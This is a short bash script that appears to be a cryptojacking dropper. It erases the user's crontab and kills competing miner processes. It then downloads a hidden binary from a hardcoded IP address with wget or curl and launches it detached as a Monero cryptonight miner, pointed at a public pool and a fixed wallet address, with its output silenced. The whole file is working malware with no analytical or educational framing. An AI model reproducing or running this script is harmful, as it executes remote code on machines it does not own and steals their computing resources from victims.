#!/bin/bash

crontab -r
cd ~

(ps auxf | grep -v grep | grep -a kworker34 |awk '{print $2}'|xargs kill -9)
(ps auxf | grep -v grep | grep -a .daemond |awk '{print $2}'|xargs kill -9)
(ps auxf | grep -v grep | grep -a cryptonight |awk '{print $2}'|xargs kill -9)
(ps auxf | grep -v grep | grep -a 91.235.143.237 |awk '{print $2}'|xargs kill -9)

if [ -f .daemond ]; then
  rm -rf .daemond
fi

if [ -f /usr/bin/wget ]; then
  /usr/bin/wget http://198.211.121.75/.daemond -q
elif [-f /usr/bin/curl ]; then
  /usr/bin/curl -O -s http://198.211.121.75/.daemond
fi

if [ -f .daemond ]; then
  chmod +x .daemond
  setsid ./.daemond -a cryptonight -o stratum+tcp://pool.minexmr.com:4444 -u 44gYaAq4Hwkeqi8jedbcw1LzyUY2J5zjvNVqdaC4DTzaANPE1REssSiGV7jGL9PXvx7KcJfZFfPvsNVdwBRjSBTf7AQVSxu -p x 1>&- 2>&- &
fi

rm -rf {0}

